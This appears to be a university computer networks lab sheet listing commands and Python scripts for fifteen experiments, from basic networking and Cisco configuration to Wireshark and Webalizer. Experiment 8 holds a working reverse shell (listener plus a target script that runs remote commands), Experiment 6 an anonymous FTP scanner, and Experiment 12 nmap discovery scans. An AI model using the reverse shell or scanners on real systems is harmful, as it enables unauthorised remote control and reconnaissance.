@@ -1,0 +1,382 @@
+Computer Networks Lab - All Experiments Codes / Commands / Scripts
+================================================================
+
+Experiment 1 – Basic Networking Commands
+----------------------------------------
+
+Windows:
+ipconfig /all
+ping 8.8.8.8
+tracert google.com
+netstat -an
+nslookup google.com
+arp -a
+route print
+
+Linux:
+ip a
+ping -c 4 8.8.8.8
+traceroute google.com
+ss -tuln
+nslookup google.com
+arp -a
+ip route
+
+
+Experiment 2 – Manual IP Assignment
+-----------------------------------
+
+Linux:
+sudo ip addr add 192.168.1.10/24 dev eth0
+sudo ip route add default via 192.168.1.1
+ip a
+ping 192.168.1.1
+
+Windows (GUI):
+Network Settings → Change adapter options → IPv4 → Use the following IP address
+IP: 192.168.1.10
+Subnet: 255.255.255.0
+Gateway: 192.168.1.1
+DNS: 8.8.8.8
+
+
+Experiment 3 – Network Cables & Crimping
+----------------------------------------
+
+T568B (Straight-through - most common):
+1. Orange-White
+2. Orange
+3. Green-White
+4. Blue
+5. Blue-White
+6. Green
+7. Brown-White
+8. Brown
+
+T568A (use on one end for Cross-over):
+1. Green-White
+2. Green
+3. Orange-White
+4. Blue
+5. Blue-White
+6. Orange
+7. Brown-White
+8. Brown
+
+Note:
+- Same standard on both ends = Straight-through
+- Different standards = Cross-over
+
+
+Experiment 4 – Packet Sniffing using Raw Sockets
+------------------------------------------------
+
+File: sniffer.py
+
+import socket
+import struct
+
+def mac(addr):
+    return ':'.join(f'{b:02x}' for b in addr)
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+
+print("Sniffing... Press Ctrl+C to stop")
+while True:
+    raw, _ = s.recvfrom(65535)
+    eth = struct.unpack('!6s6sH', raw[:14])
+    print(f"Src MAC: {mac(eth[1])}  Dst MAC: {mac(eth[0])}  Proto: {hex(eth[2])}")
+    
+    if eth[2] == 0x0800:  # IPv4
+        ip_header = struct.unpack('!BBHHHBBH4s4s', raw[14:34])
+        src_ip = socket.inet_ntoa(ip_header[8])
+        dst_ip = socket.inet_ntoa(ip_header[9])
+        print(f"   IP: {src_ip} --> {dst_ip}   TTL: {ip_header[5]}")
+
+Run:
+sudo python3 sniffer.py
+
+
+Experiment 5 – Customized Ping
+------------------------------
+
+File: custom_ping.py
+
+import socket, struct, time, os, select
+
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        s += (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
+    s = (s >> 16) + (s & 0xffff)
+    return ~s & 0xffff
+
+def ping(host, count=4):
+    dest = socket.gethostbyname(host)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    pid = os.getpid() & 0xFFFF
+
+    for seq in range(count):
+        header = struct.pack('bbHHh', 8, 0, 0, pid, seq)
+        data = b'CustomPing'
+        cs = checksum(header + data)
+        header = struct.pack('bbHHh', 8, 0, cs, pid, seq)
+        
+        sock.sendto(header + data, (dest, 0))
+        start = time.time()
+        ready = select.select([sock], [], [], 2)
+        
+        if ready[0]:
+            sock.recvfrom(1024)
+            rtt = (time.time() - start) * 1000
+            print(f"Reply from {dest}: seq={seq} time={rtt:.2f} ms")
+        else:
+            print(f"Request timed out (seq={seq})")
+    sock.close()
+
+ping("google.com")
+
+Run:
+sudo python3 custom_ping.py
+
+
+Experiment 6 – Anonymous FTP Scanner
+------------------------------------
+
+File: ftp_scanner.py
+
+import ftplib
+from concurrent.futures import ThreadPoolExecutor
+
+def scan(ip):
+    try:
+        ftp = ftplib.FTP(timeout=3)
+        ftp.connect(ip, 21)
+        ftp.login("anonymous", "anon@test.com")
+        print(f"[+] {ip} → Anonymous FTP OPEN")
+        print("   Files:", ftp.nlst()[:5])
+        ftp.quit()
+    except:
+        pass
+
+targets = [f"192.168.1.{i}" for i in range(1, 50)]
+with ThreadPoolExecutor(max_workers=20) as executor:
+    executor.map(scan, targets)
+
+
+Experiment 7 – Simple Calculator using XML-RPC
+----------------------------------------------
+
+Server (calc_server.py):
+
+from xmlrpc.server import SimpleXMLRPCServer
+
+def add(a, b): return a + b
+def sub(a, b): return a - b
+def mul(a, b): return a * b
+def div(a, b): return a / b if b != 0 else "Error"
+
+server = SimpleXMLRPCServer(("localhost", 8000), allow_none=True)
+server.register_function(add)
+server.register_function(sub)
+server.register_function(mul)
+server.register_function(div)
+
+print("Calculator Server running on port 8000...")
+server.serve_forever()
+
+
+Client (calc_client.py):
+
+import xmlrpc.client
+
+proxy = xmlrpc.client.ServerProxy("http://localhost:8000")
+print("10 + 5 =", proxy.add(10, 5))
+print("10 - 5 =", proxy.sub(10, 5))
+print("10 * 5 =", proxy.mul(10, 5))
+print("10 / 5 =", proxy.div(10, 5))
+
+
+Experiment 8 – Reverse Shell using TCP Sockets
+----------------------------------------------
+
+Listener (listener.py) - Run first:
+
+import socket
+
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(("0.0.0.0", 4444))
+s.listen(1)
+print("[*] Waiting for connection...")
+conn, addr = s.accept()
+print(f"[+] Connected: {addr}")
+
+while True:
+    cmd = input("Shell> ")
+    if cmd.lower() == "exit":
+        conn.send(b"exit")
+        break
+    conn.send(cmd.encode())
+    print(conn.recv(4096).decode(errors="ignore"))
+conn.close()
+
+
+Shell (shell.py) - Target:
+
+import socket, subprocess
+
+s = socket.socket()
+s.connect(("127.0.0.1", 4444))   # change IP if needed
+
+while True:
+    cmd = s.recv(1024).decode().strip()
+    if cmd.lower() == "exit":
+        break
+    output = subprocess.getoutput(cmd)
+    s.send(output.encode())
+s.close()
+
+
+Experiment 9 – Simple Topology (Cisco Packet Tracer)
+----------------------------------------------------
+
+Router Configuration:
+
+enable
+configure terminal
+hostname MainRouter
+
+interface GigabitEthernet0/0
+ip address 192.168.1.1 255.255.255.0
+no shutdown
+
+interface GigabitEthernet0/1
+ip address 192.168.2.1 255.255.255.0
+no shutdown
+
+end
+write memory
+
+PC Configuration Example:
+PC0: 192.168.1.10 / 255.255.255.0 / Gateway 192.168.1.1
+PC1: 192.168.1.11 / 255.255.255.0 / Gateway 192.168.1.1
+PC2: 192.168.2.10 / 255.255.255.0 / Gateway 192.168.2.1
+
+
+Experiment 10 – Switch Configuration (VLAN + Port Security)
+-----------------------------------------------------------
+
+enable
+configure terminal
+
+vlan 10
+name SALES
+vlan 20
+name HR
+
+interface FastEthernet0/1
+switchport mode access
+switchport access vlan 10
+switchport port-security
+switchport port-security maximum 1
+switchport port-security violation shutdown
+switchport port-security mac-address sticky
+
+interface FastEthernet0/24
+switchport mode trunk
+
+end
+show vlan brief
+show port-security
+
+
+Experiment 11 – NAT Configuration
+---------------------------------
+
+interface GigabitEthernet0/0
+ip address 192.168.1.1 255.255.255.0
+ip nat inside
+no shutdown
+
+interface Serial0/0/0
+ip address 203.0.113.1 255.255.255.252
+ip nat outside
+no shutdown
+
+access-list 1 permit 192.168.1.0 0.0.0.255
+ip nat inside source list 1 interface Serial0/0/0 overload
+
+show ip nat translations
+show ip nat statistics
+
+
+Experiment 12 – Nmap Host Discovery
+-----------------------------------
+
+# ARP Scan (local network)
+nmap -PR -sn 192.168.1.0/24
+
+# ICMP Echo
+nmap -PE -sn 10.10.x.x
+
+# TCP SYN Ping
+nmap -PS22,80,443 -sn 10.10.x.x
+
+# TCP ACK Ping
+nmap -PA80 -sn 10.10.x.x
+
+# UDP Ping
+nmap -PU53 -sn 10.10.x.x
+
+# Combined + Verbose
+nmap -PE -PS22,80 -PU53 -sn -v 10.10.x.x/24
+
+# Save output
+nmap -sn -oN discovery.txt 10.10.x.x/24
+
+
+Experiment 13 – Network Forensics (PcapXray)
+--------------------------------------------
+
+git clone https://github.com/Srinivas11789/PcapXray.git
+cd PcapXray
+pip3 install -r requirements.txt
+python3 Source/main.py
+
+
+Experiment 14 – Wireshark Analysis
+----------------------------------
+
+Useful Display Filters:
+tcp
+udp
+http
+dns
+arp
+icmp
+dhcp
+ip.addr == 8.8.8.8
+tcp.port == 80
+http.request.method == GET
+
+CLI alternative (tshark):
+sudo tshark -i eth0 -c 100 -w capture.pcapng
+tshark -r capture.pcapng -Y "http"
+tshark -r capture.pcapng -Y "dns"
+
+
+Experiment 15 – Webalizer
+-------------------------
+
+sudo apt update
+sudo apt install apache2 webalizer -y
+
+# Generate some traffic
+for i in {1..50}; do curl -s http://localhost > /dev/null; done
+
+# Run Webalizer
+sudo webalizer /var/log/apache2/access.log -o /var/www/html/webalizer/
+
+# View report
+# Open browser → http://localhost/webalizer/
